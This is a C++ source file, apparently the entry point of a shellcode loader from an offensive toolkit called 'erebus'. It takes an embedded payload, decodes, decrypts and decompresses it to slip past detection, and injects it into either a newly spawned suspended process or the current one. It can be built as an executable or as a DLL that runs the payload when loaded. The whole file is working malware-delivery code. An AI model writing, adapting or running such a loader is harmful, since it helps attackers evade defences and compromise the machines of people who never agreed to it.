#include "../include/shellcode.hpp"
#include "../include/loader.hpp"
#include "../include/config.hpp" // Explicitly include to ensure macros are visible

// =========================================================================
// ENTRY POINT
// =========================================================================
VOID entry(void) {

    erebus::config.injection_method = ExecuteShellcode;

#ifdef DecryptShellcode
    erebus::config.decryption_method = DecryptShellcode;
#else
    erebus::config.decryption_method = nullptr;
#endif

    HANDLE process_handle = NULL;
    HANDLE thread_handle = NULL;

    // Allocate memory for shellcode on heap
    BYTE* pPayload = (BYTE*)malloc(sizeof(shellcode));
    if (!pPayload) return; // Allocation failed

    // Copy raw shellcode to heap
    memcpy(pPayload, shellcode, sizeof(shellcode));
    SIZE_T shellcode_size = sizeof(shellcode);

    if (shellcode_size == 0) {
        free(pPayload);
        return;
    }

    // ============================================================
    // 1. DEOBFUSCATE (via config-based approach)
    // ============================================================
    
    // Auto-detect if string encoding is used (Base64/etc)
    erebus::AutoDetectAndDecodeString((CHAR*)pPayload, shellcode_size, &pPayload, &shellcode_size);

    if (erebus::config.decryption_method != nullptr) {
        erebus::config.decryption_method(pPayload, shellcode_size, key, sizeof(key));
    }

    // Handle compression (LZNT1/RLE)
    erebus::DecompressShellcode(&pPayload, &shellcode_size);

    // ============================================================
    // 2. TARGET PROCESS SETUP
    // ============================================================
#if CONFIG_INJECTION_MODE == 1
    // Remote Injection
    wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
    if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle)) {
        free(pPayload);
        return;
    }
#elif CONFIG_INJECTION_MODE == 2
    // Local Injection
    process_handle = NtCurrentProcess();
    thread_handle = NtCurrentThread();
#endif

    // ============================================================
    // 3. INJECT
    // ============================================================
    if (erebus::config.injection_method != nullptr) {
        erebus::config.injection_method(pPayload, shellcode_size, process_handle, thread_handle);
    }

    // Cleanup - securely zero memory before freeing
    RtlSecureZeroMemory(pPayload, shellcode_size);
    return;
}

// =========================================================================
// STANDARD ENTRY POINTS
// =========================================================================
#if _DEBUG
int main() {
    entry();
    return 0;
}
#elif _WINDLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        entry();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
#else
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    entry();
    return 0;
}
#endif
